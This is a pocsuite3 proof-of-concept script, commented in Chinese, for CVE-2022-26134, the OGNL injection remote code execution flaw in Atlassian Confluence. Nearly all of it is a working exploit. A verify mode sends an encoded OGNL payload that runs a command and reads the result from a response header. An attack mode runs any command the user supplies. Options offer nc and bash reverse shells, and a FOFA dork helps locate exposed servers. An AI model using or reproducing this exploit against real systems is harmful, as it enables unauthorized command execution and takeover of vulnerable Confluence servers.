#! /usr/bin/env python3
# coding:utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
import random
import json
from collections import OrderedDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptDict
import re
import base64

class TestPOC(POCBase):
    vulID = '0'                                                            # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1.0'                                                        # 默认为1
    cve = 'CVE-2022-26134'                                                 # cve编号
    author = ['youyu']                                                     # PoC作者的大名
    vulDate = '2022-06-02'                                                 # 漏洞公开的时间,不知道就写今天
    createDate = '2022-07-18'                                              # 编写 PoC 的日期
    updateDate = '2022-07-18'                                              # PoC 更新的时间,默认和编写时间一样
    references = ['https://blog.csdn.net/weixin_42489549/article/details/125516062']        # 漏洞地址来源,0day不用写
    name = 'CVE-2022-26134 RCE 检测脚本'                                     # PoC 名称
    appPowerLink = 'https://www.atlassian.com/'                                                      # 漏洞厂商主页地址
    appName = 'Confluence'                                       # 漏洞应用名称
    appVersion = 'Confluence Server and Data Center >= 1.3.0, < 7.4.17, < 7.13.7, < 7.14.3, < 7.15.2, < 7.16.4, < 7.17.4, < 7.18.1'                            # 漏洞影响版本
    vulType = 'cmd-exec'       # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''Atlassian Confluence存在远程代码执行漏洞，攻击者可以利用该漏洞直接获取目标系统权限。'''                                           # 漏洞简要描述
    dork = {'fofa：app="Confluence"'}                            # fofa、钟馗之眼的编写方式
    suricata_request = ''''''                                             # suricata请求规则
    suricata_response = ''''''                                            # suricaet返回规则
    samples = ['http://192.168.1.7:8090']                                                        # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20111111111111111%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D']                                               # PoC
    pocDesc = ''' poc的用法描述
验证模式：python3 cli.py -r poc/Atlassian_Confluence_rce_CVE-2022-26134_youyu.py -u http://192.168.1.7:8090 --verify    输出：11111111111111
攻击模式：python3 cli.py -r poc/Atlassian_Confluence_rce_CVE-2022-26134_youyu.py -u http://192.168.1.7:8090 --attack --command "ls -l"
'''                                        # POC用法描述

    def _verify(self):
        output = Output(self)
        result = {}
        payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20111111111111111%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
        response = requests.get("{}/{}/".format(self.url, payload), verify=False, allow_redirects=False)
    
        try:
            if response.status_code == 302:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = response.headers["X-Cmd-Response"]
        except:
            return
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o



#攻击模式：传入自定义命令，执行自定义命令
    def _attack(self):

        output = Output(self)
        result = {}
        cmd = self.get_option("command")
        payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(cmd)
        response = requests.get("{}/{}/".format(self.url, payload), verify=False, allow_redirects=False)
        
        try:
            if response.status_code == 302:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = response.headers["X-Cmd-Response"]
        except:
            return
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)